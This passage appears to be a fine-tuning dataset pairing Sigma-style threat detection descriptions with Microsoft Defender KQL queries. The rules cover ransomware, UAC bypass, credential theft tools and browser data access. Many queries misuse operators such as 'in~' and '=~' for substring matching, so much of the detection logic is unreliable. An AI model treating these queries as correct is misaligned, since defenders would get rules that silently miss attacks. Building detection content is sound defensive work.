ProcessCommandLine contains \"462\") or (ProcessCommandLine contains \"System[EventID=462\" and ProcessCommandLine contains \"]\") or (ProcessCommandLine contains \"EventCode=\" and ProcessCommandLine contains \"4778\") or (ProcessCommandLine contains \"EventIdentifier=\" and ProcessCommandLine contains \"4778\") or (ProcessCommandLine contains \"EventCode=\" and ProcessCommandLine contains \"25\") or (ProcessCommandLine contains \"EventIdentifier=\" and ProcessCommandLine contains \"25\")) or (ProcessCommandLine in~ (\"Microsoft-Windows-PowerShell\", \"Microsoft-Windows-Security-Auditing\", \"Microsoft-Windows-TerminalServices-LocalSessionManager\", \"Microsoft-Windows-TerminalServices-RemoteConnectionManager\", \"Microsoft-Windows-Windows Defender\", \"PowerShellCore\", \"Security\", \"Windows PowerShell\"))) and ((ProcessCommandLine in~ (\"Select\", \"Win32_NTLogEvent\")) or ((ProcessCommandLine in~ (\" qe \", \" query-events \")) and (FolderPath endswith \"\\\\wevtutil.exe\" or ProcessVersionInfoOriginalFileName =~ \"wevtutil.exe\")) or (ProcessCommandLine =~ \" ntevent\" and (FolderPath endswith \"\\\\wmic.exe\" or ProcessVersionInfoOriginalFileName =~ \"wmic.exe\")) or (ProcessCommandLine in~ (\"Get-WinEvent \", \"get-eventlog \")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Rorschach ransomware execution activity Topic: proc_creation_win_malware_rorschach_ransomware_activity"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"11111111\" and (InitiatingProcessFolderPath in~ (\"\\\\bcdedit.exe\", \"\\\\net.exe\", \"\\\\net1.exe\", \"\\\\netsh.exe\", \"\\\\wevtutil.exe\", \"\\\\vssadmin.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to shell context menu commands. Use this rule to hunt for potential anomalies and suspicious shell commands. Topic: registry_set_shell_context_menu_tampering"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Software\\\\Classes*\" and RegistryKey endswith \"\\\\shell*\" and RegistryKey endswith \"\\\\command*\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a registry key used by IceID in a campaign that distributes malicious OneNote files Topic: registry_event_malware_qakbot_registry"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Software\\\\firm\\\\soft\\\\Name\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects using SettingSyncHost.exe to run hijacked binary Topic: proc_creation_win_lolbin_settingsynchost"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (not((InitiatingProcessFolderPath in~ (\"C:\\\\Windows\\\\System32\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\")))) and (InitiatingProcessCommandLine in~ (\"cmd.exe /c\", \"RoamDiag.cmd\", \"-outputpath\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Windows command lines that miss a space before or after the /c flag when running a command using the cmd.exe.\nThis could be a sign of obfuscation of a fat finger problem (typo by the developer).\n Topic: proc_creation_win_cmd_no_space_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"cmd.exe/c\", \"\\\\cmd/c\", \"\\\"cmd/c\", \"cmd.exe/k\", \"\\\\cmd/k\", \"\\\"cmd/k\", \"cmd.exe/r\", \"\\\\cmd/r\", \"\\\"cmd/r\")) or (ProcessCommandLine in~ (\"/cwhoami\", \"/cpowershell\", \"/cschtasks\", \"/cbitsadmin\", \"/ccertutil\", \"/kwhoami\", \"/kpowershell\", \"/kschtasks\", \"/kbitsadmin\", \"/kcertutil\")) or (ProcessCommandLine in~ (\"cmd.exe /c\", \"cmd /c\", \"cmd.exe /k\", \"cmd /k\", \"cmd.exe /r\", \"cmd /r\"))) and (not(((ProcessCommandLine in~ (\"cmd.exe /c\") or ProcessCommandLine contains \"AppData\\\\Local\\\\Programs\\\\Microsoft VS Code\\\\resources\\\\app\\\\node_modules\" or ProcessCommandLine endswith \"cmd.exe/c .\") or (ProcessCommandLine in~ (\"cmd.exe /c \", \"cmd /c \", \"cmd.exe /k \", \"cmd /k \", \"cmd.exe /r \", \"cmd /r \")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"whoami.exe\" with the \"/all\" flag Topic: proc_creation_win_whoami_all_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\whoami.exe\" or ProcessVersionInfoOriginalFileName =~ \"whoami.exe\") and (ProcessCommandLine contains \" -all\" or ProcessCommandLine contains \" /all\" or ProcessCommandLine contains \" \u2013all\" or ProcessCommandLine contains \" \u2014all\" or ProcessCommandLine contains \" \u2015all\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of netsh with the \"advfirewall\" and the \"set\" option in order to set new values for properties of a existing rule Topic: proc_creation_win_netsh_fw_set_rule"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" firewall \", \" set \")) and (FolderPath endswith \"\\\\netsh.exe\" or ProcessVersionInfoOriginalFileName =~ \"netsh.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may search for private key certificate files on compromised systems for insecurely stored credential Topic: proc_creation_win_susp_private_keys_recon"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\".key\", \".pgp\", \".gpg\", \".ppk\", \".p12\", \".pem\", \".pfx\", \".cer\", \".p7b\", \".asc\")) and ((ProcessCommandLine =~ \"dir \" and (FolderPath endswith \"\\\\cmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"Cmd.Exe\")) or (ProcessCommandLine =~ \"Get-ChildItem \" and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")))) or (FolderPath endswith \"\\\\findstr.exe\" or ProcessVersionInfoOriginalFileName =~ \"FINDSTR.EXE\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the volume shadow copy service initialization and processing via esentutl. Registry keys such as HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\VSS\\\\Diag\\\\VolSnap\\\\Volume are captured. Topic: registry_event_esentutl_volume_shadow_copy_service_keys"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (InitiatingProcessFolderPath =~ \"esentutl.exe\" and RegistryKey contains \"System\\\\CurrentControlSet\\\\Services\\\\VSS\") and (not(RegistryKey contains \"System\\\\CurrentControlSet\\\\Services\\\\VSS\\\\Start\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious ways to download files from Microsoft domains that are used to store attachments in Emails or OneNote documents Topic: proc_creation_win_susp_download_office_domain"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"https://attachment.outlook.live.net/owa/\", \"https://onenoteonlinesync.onenote.com/onenoteonlinesync/\")) and ((FolderPath endswith \"\\\\curl.exe\" or FolderPath endswith \"\\\\wget.exe\") or (ProcessCommandLine contains \"Invoke-WebRequest\" or ProcessCommandLine contains \"iwr \" or ProcessCommandLine contains \"curl \" or ProcessCommandLine contains \"wget \" or ProcessCommandLine contains \"Start-BitsTransfer\" or ProcessCommandLine contains \".DownloadFile(\" or ProcessCommandLine contains \".DownloadString(\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects file access requests to chromium based browser sensitive files by uncommon processes.\nCould indicate potential attempt of stealing sensitive information.\n Topic: file_access_win_browsers_chromium_sensitive_files"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName contains \"\\\\User Data\\\\Default\\\\Cookies\" or FileName contains \"\\\\User Data\\\\Default\\\\History\" or FileName contains \"\\\\User Data\\\\Default\\\\Network\\\\Cookies\" or FileName contains \"\\\\User Data\\\\Default\\\\Web Data\") and (not(((InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\\", \"C:\\\\Program Files\\\\\", \"C:\\\\Windows\\\\system32\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\")) or InitiatingProcessFolderPath =~ \"System\"))) and (not((InitiatingProcessFolderPath in~ (\"\\\\MpCopyAccelerator.exe\", \"\\\\MsMpEng.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a macro file for Outlook. Topic: file_event_win_office_outlook_macro_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\Microsoft\\\\Outlook\\\\VbaProject.OTM\" and InitiatingProcessFolderPath =~ \"\\\\outlook.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the presence of the \"u202+E\" character, which causes a terminal, browser, or operating system to render text in a right-to-left sequence.\nThis is used as an obfuscation and masquerading techniques.\n Topic: proc_creation_win_susp_right_to_left_override"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"\u202e\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of at/atd which are utilities that are used to schedule tasks.\nThey are often abused by adversaries to maintain persistence or to perform task scheduling for initial or recurring execution of malicious code\n Topic: proc_creation_lnx_at_command"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath in~ (\"/at\", \"/atd\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects various indicators of Microsoft Connection Manager Profile Installer execution Topic: registry_event_cmstp_execution_by_registry"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\cmmgr32.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the \"MaxMpxCt\" registry value.\nMaxMpxCt specifies the maximum outstanding network requests for the server per client, which is used when negotiating a Server Message Block (SMB) connection with a client. Note if the value is set beyond 125 older Windows 9x clients will fail to negotiate.\nRansomware threat actors and operators (specifically BlackCat) were seen increasing this value in order to handle a higher volume of traffic.\n Topic: registry_set_optimize_file_sharing_network"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Services\\\\LanmanServer\\\\Parameters\\\\MaxMpxCt\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of an executable that is typically used by PlugX for DLL side loading starting from an uncommon location Topic: proc_creation_win_malware_plugx_susp_exe_locations"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFolderPath =~ \"\\\\CamMute.exe\" and (not((FolderPath contains \"\\\\Lenovo\\\\Communication Utility\\\\\" or FolderPath contains \"\\\\Lenovo\\\\Communications Utility\\\\\")))) or (InitiatingProcessFolderPath =~ \"\\\\chrome_frame_helper.exe\" and (not(FolderPath contains \"\\\\Google\\\\Chrome\\\\application\\\\\"))) or (InitiatingProcessFolderPath =~ \"\\\\dvcemumanager.exe\" and (not(FolderPath contains \"\\\\Microsoft Device Emulator\\\\\"))) or (InitiatingProcessFolderPath =~ \"\\\\Gadget.exe\" and (not(FolderPath contains \"\\\\Windows Media Player\\\\\"))) or (InitiatingProcessFolderPath =~ \"\\\\hcc.exe\" and (not(FolderPath contains \"\\\\HTML Help Workshop\\\\\"))) or (InitiatingProcessFolderPath =~ \"\\\\hkcmd.exe\" and (not((FolderPath contains \"\\\\System32\\\\\" or FolderPath contains \"\\\\SysNative\\\\\" or FolderPath contains \"\\\\SysWow64\\\\\")))) or (InitiatingProcessFolderPath =~ \"\\\\Mc.exe\" and (not((FolderPath contains \"\\\\Microsoft Visual Studio\" or FolderPath contains \"\\\\Microsoft SDK\" or FolderPath contains \"\\\\Windows Kit\")))) or (InitiatingProcessFolderPath =~ \"\\\\MsMpEng.exe\" and (not((FolderPath contains \"\\\\Microsoft Security Client\\\\\" or FolderPath contains \"\\\\Windows Defender\\\\\" or FolderPath contains \"\\\\AntiMalware\\\\\")))) or (InitiatingProcessFolderPath =~ \"\\\\msseces.exe\" and (not((FolderPath contains \"\\\\Microsoft Security Center\\\\\" or FolderPath contains \"\\\\Microsoft Security Client\\\\\" or FolderPath contains \"\\\\Microsoft Security Essentials\\\\\")))) or (InitiatingProcessFolderPath =~ \"\\\\OInfoP11.exe\" and (not(FolderPath contains \"\\\\Common Files\\\\Microsoft Shared\\\\\"))) or (InitiatingProcessFolderPath =~ \"\\\\OleView.exe\" and (not((FolderPath contains \"\\\\Microsoft Visual Studio\" or FolderPath contains \"\\\\Microsoft SDK\" or FolderPath contains \"\\\\Windows Kit\" or FolderPath contains \"\\\\Windows Resource Kit\\\\\")))) or (InitiatingProcessFolderPath =~ \"\\\\rc.exe\" and (not((FolderPath contains \"\\\\Microsoft Visual Studio\" or FolderPath contains \"\\\\Microsoft SDK\" or FolderPath contains \"\\\\Windows Kit\" or FolderPath contains \"\\\\Windows Resource Kit\\\\\" or FolderPath contains \"\\\\Microsoft.NET\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the SharpDPAPI tool based on CommandLine flags and PE metadata.\nSharpDPAPI is a C# port of some DPAPI functionality from the Mimikatz project.\n Topic: proc_creation_win_hktl_sharp_dpapi_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\SharpDPAPI.exe\" or ProcessVersionInfoOriginalFileName =~ \"SharpDPAPI.exe\") or ((ProcessCommandLine in~ (\" backupkey \", \" blob \", \" certificates \", \" credentials \", \" keepass \", \" masterkeys \", \" rdg \", \" vaults \")) and ((ProcessCommandLine in~ (\" /file:\", \" /machine\", \" /mkfile:\", \" /password:\", \" /pvk:\", \" /server:\", \" /target:\", \" /unprotect\")) or (ProcessCommandLine in~ (\" {\", \"}:\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the Add-In deployment cache updating utility (AddInutil.exe) with uncommon Addinroot or Pipelineroot paths. An adversary may execute AddinUtil.exe with uncommon Addinroot/Pipelineroot paths that point to the adversaries Addins.Store payload.\n Topic: proc_creation_win_addinutil_uncommon_cmdline"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"-AddInRoot:\", \"-PipelineRoot:\")) and (FolderPath endswith \"\\\\addinutil.exe\" or ProcessVersionInfoOriginalFileName =~ \"AddInUtil.exe\")) and (not((ProcessCommandLine in~ (\"-AddInRoot:\\\"C:\\\\Program Files (x86)\\\\Common Files\\\\Microsoft Shared\\\\VSTA\", \"-AddInRoot:C:\\\\Program Files (x86)\\\\Common Files\\\\Microsoft Shared\\\\VSTA\", \"-PipelineRoot:\\\"C:\\\\Program Files (x86)\\\\Common Files\\\\Microsoft Shared\\\\VSTA\", \"-PipelineRoot:C:\\\\Program Files (x86)\\\\Common Files\\\\Microsoft Shared\\\\VSTA\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Ntvdm.exe allows the execution of 16-bit Windows applications on 32-bit Windows operating systems, as well as the execution of both 16-bit and 32-bit DOS applications Topic: proc_creation_win_susp_16bit_application"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath in~ (\"\\\\ntvdm.exe\", \"\\\\csrstub.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations. Topic: proc_creation_win_mstsc_run_local_rpd_file_susp_parent"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\mstsc.exe\" or ProcessVersionInfoOriginalFileName =~ \"mstsc.exe\") and (InitiatingProcessFileName in~ (\"\\\\brave.exe\", \"\\\\CCleanerBrowser.exe\", \"\\\\chrome.exe\", \"\\\\chromium.exe\", \"\\\\firefox.exe\", \"\\\\iexplore.exe\", \"\\\\microsoftedge.exe\", \"\\\\msedge.exe\", \"\\\\opera.exe\", \"\\\\vivaldi.exe\", \"\\\\whale.exe\", \"\\\\outlook.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of specific processes and command line combination.\nThese were seen being created by Forest Blizzard as described by MSFT.\n Topic: proc_creation_win_apt_forest_blizzard_activity"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (SHA256 startswith \"6b311c0a977d21e772ac4e99762234da852bbf84293386fbe78622a96c0b052f\" or SHA256 startswith \"c60ead92cd376b689d1b4450f2578b36ea0bf64f3963cfa5546279fa4424c2a5\") or (ProcessCommandLine in~ (\"Get-ChildItem\", \".save\", \"Compress-Archive -DestinationPath C:\\\\ProgramData\\\\\")) or ((ProcessCommandLine in~ (\"servtask.bat\", \"execute.bat\", \"doit.bat\")) and InitiatingProcessFolderPath =~ \"\\\\schtasks.exe\") or ((ProcessCommandLine in~ (\"Delete\", \"/F \", \"\\\\Microsoft\\\\Windows\\\\WinSrv\")) and InitiatingProcessFolderPath =~ \"\\\\schtasks.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of PktMon, a tool that captures network packets. Topic: proc_creation_win_pktmon_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\pktmon.exe\" or ProcessVersionInfoOriginalFileName =~ \"PktMon.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of the \"PSScriptPolicyTest\" PowerShell script by an uncommon process. This file is usually generated by Microsoft Powershell to test against Applocker. Topic: file_event_win_ps_script_policy_test_creation_by_uncommon_process"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"__PSScriptPolicyTest_\" and (not((InitiatingProcessFolderPath in~ (\":\\\\Program Files\\\\PowerShell\\\\7-preview\\\\pwsh.exe\", \":\\\\Program Files\\\\PowerShell\\\\7\\\\pwsh.exe\", \":\\\\Windows\\\\System32\\\\dsac.exe\", \":\\\\Windows\\\\System32\\\\sdiagnhost.exe\", \":\\\\Windows\\\\System32\\\\ServerManager.exe\", \":\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell_ise.exe\", \":\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \":\\\\Windows\\\\System32\\\\wsmprovhost.exe\", \":\\\\Windows\\\\SysWOW64\\\\sdiagnhost.exe\", \":\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell_ise.exe\", \":\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects command line parameters used by Hydra password guessing hack tool Topic: proc_creation_win_hktl_hydra"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"^USER^\", \"^PASS^\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential BlueMushroom DLL loading activity via regsvr32 from AppData Local Topic: proc_creation_win_apt_aptc12_bluemushroom"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"regsvr32\", \"\\\\AppData\\\\Local\\\\\", \".dll\", \",DllEntry\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"reg.exe\" for enabling/disabling the RDP service on the host by tampering with the CurrentControlSet\\Control\\Terminal Server values Topic: proc_creation_win_reg_rdp_keys_tamper"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\" add \", \"\\\\CurrentControlSet\\\\Control\\\\Terminal Server\", \"REG_DWORD\", \" /f\")) and (FolderPath endswith \"\\\\reg.exe\" or ProcessVersionInfoOriginalFileName =~ \"reg.exe\")) and ((ProcessCommandLine in~ (\"Licensing Core\", \"EnableConcurrentSessions\")) or (ProcessCommandLine in~ (\"WinStations\\\\RDP-Tcp\", \"MaxInstanceCount\", \"fEnableWinStation\", \"TSUserEnabled\", \"TSEnabled\", \"TSAppCompat\", \"IdleWinStationPoolCount\", \"TSAdvertise\", \"AllowTSConnections\", \"fSingleSessionPerUser\", \"fDenyTSConnections\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of MeshAgent to execute commands on the target host, particularly when threat actors might abuse it to execute commands directly.\nMeshAgent can execute commands on the target host by leveraging win-console to obscure their activities and win-dispatcher to run malicious code through IPC with child processes.\n Topic: proc_creation_win_remote_access_tools_meshagent_exec"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\meshagent.exe\" and (InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a specific binary name seen used by SNAKE malware during its installation as described by CISA in their report Topic: proc_creation_win_malware_snake_installer_exec"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFolderPath in~ (\"\\\\jpsetup.exe\", \"\\\\jpinst.exe\")) and (not((ProcessCommandLine =~ \"\" or (ProcessCommandLine in~ (\"jpinst.exe\", \"jpinst\", \"jpsetup.exe\", \"jpsetup\")) or isnull(ProcessCommandLine))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects nltest commands that can be used for information discovery Topic: proc_creation_win_nltest_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\nltest.exe\" or ProcessVersionInfoOriginalFileName =~ \"nltestrk.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of WMIC with the \"csproduct\" which is used to obtain information such as hardware models and vendor information Topic: proc_creation_win_wmic_recon_csproduct"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"csproduct\" and (FolderPath endswith \"\\\\wmic.exe\" or ProcessVersionInfoOriginalFileName =~ \"wmic.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects UAC Bypass Attempt Using Microsoft Connection Manager Profile Installer Autoelevate-capable COM Objects (e.g. UACMe ID of 41, 43, 58 or 65) Topic: proc_creation_win_uac_bypass_cmstp_com_object_access"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessCommandLine in~ (\" /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}\", \" /Processid:{3E000D72-A845-4CD9-BD83-80C07C3B881F}\", \" /Processid:{BD54C901-076B-434E-B6C7-17C531F4AB41}\", \" /Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}\", \" /Processid:{E9495B87-D950-4AB5-87A5-FF6D70BF3E90}\")) and InitiatingProcessFileName =~ \"\\\\DllHost.exe\" and (InitiatingProcessIntegrityLevel in~ (\"High\", \"System\", \"S-1-16-16384\", \"S-1-16-12288\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Identifies use of Fodhelper.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes. Topic: proc_creation_win_uac_bypass_fodhelper"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\fodhelper.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the deactivation and disabling of the Scheduled defragmentation task as seen by Slingshot APT group Topic: proc_creation_win_apt_slingshot"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/TN\", \"\\\\Microsoft\\\\Windows\\\\Defrag\\\\ScheduledDefrag\")) and InitiatingProcessFolderPath =~ \"\\\\schtasks.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the Get-ADUser cmdlet to collect user information and output it to a file Topic: proc_creation_win_powershell_user_discovery_get_aduser"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" > \", \" | Select \", \"Out-File\", \"Set-Content\", \"Add-Content\")) and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may enumerate browser bookmarks to learn more about compromised hosts.\nBrowser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about\ninternal network resources such as servers, tools/dashboards, or other related infrastructure.\n Topic: proc_creation_win_where_browser_data_recon"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\where.exe\" or ProcessVersionInfoOriginalFileName =~ \"where.exe\") and (ProcessCommandLine in~ (\"places.sqlite\", \"cookies.sqlite\", \"formhistory.sqlite\", \"logins.json\", \"key4.db\", \"key3.db\", \"sessionstore.jsonlz4\", \"History\", \"Bookmarks\", \"Cookies\", \"Login Data\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detecting attempts to extract passwords with grep and laZagne Topic: proc_creation_macos_find_cred_in_files"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"password\" and InitiatingProcessFolderPath =~ \"/grep\") or ProcessCommandLine =~ \"laZagne\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects indicators of exploitation by threat actors during exploitation of the \"SlashAndGrab\" vulnerability related to ScreenConnect as reported Team Huntress\n Topic: file_event_win_apt_unknown_exploitation_indicators"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FolderPath contains \"C:\\\\Windows\\\\Temp\\\\ScreenConnect\\\\\" and FolderPath contains \"\\\\LB3.exe\") or (FolderPath contains \"C:\\\\mpyutd.msi\" or FolderPath contains \"C:\\\\perflogs\\\\RunSchedulerTaskOnce.ps1\" or FolderPath contains \"C:\\\\ProgramData\\\\1.msi\" or FolderPath contains \"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\mpyutd.msi\" or FolderPath contains \"C:\\\\ProgramData\\\\update.dat\" or FolderPath contains \"C:\\\\Users\\\\oldadmin\\\\Documents\\\\MilsoftConnect\\\\Files\\\\ta.exe\" or FolderPath contains \"C:\\\\Windows\\\\Help\\\\Help\\\\SentinelAgentCore.dll\" or FolderPath contains \"C:\\\\Windows\\\\Help\\\\Help\\\\SentinelUI.exe\" or FolderPath contains \"C:\\\\Windows\\\\spsrv.exe\" or FolderPath contains \"C:\\\\Windows\\\\Temp\\\\svchost.exe\")"}]}
